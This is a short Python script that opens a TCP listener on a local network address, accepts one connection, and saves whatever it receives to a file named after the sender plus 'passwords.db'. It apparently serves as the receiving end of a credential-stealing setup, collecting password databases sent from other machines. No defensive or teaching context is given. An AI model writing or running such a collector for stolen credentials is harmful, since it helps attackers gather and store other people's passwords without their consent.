'''
Created on 20 Jun 2015
 
@author: Robyn Hode
'''
import socket
import time


HOST = '192.168.0.104'
PORT = 1991

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    conn, addr = s.accept()

    data = None
    with conn:
        print('Connected by: ', addr)

        # Receive data
        data = conn.recv(1048576)
        conn.send(b'success')

    # Write data
    if data:
        filename = str(addr) + "passwords.db"
        with open(filename, "wb") as f:
            f.write(data)
            f.flush()

        while True:
            try:
                with open(filename, 'rb') as _:
                    break
            except IOError:
                time.sleep(2)
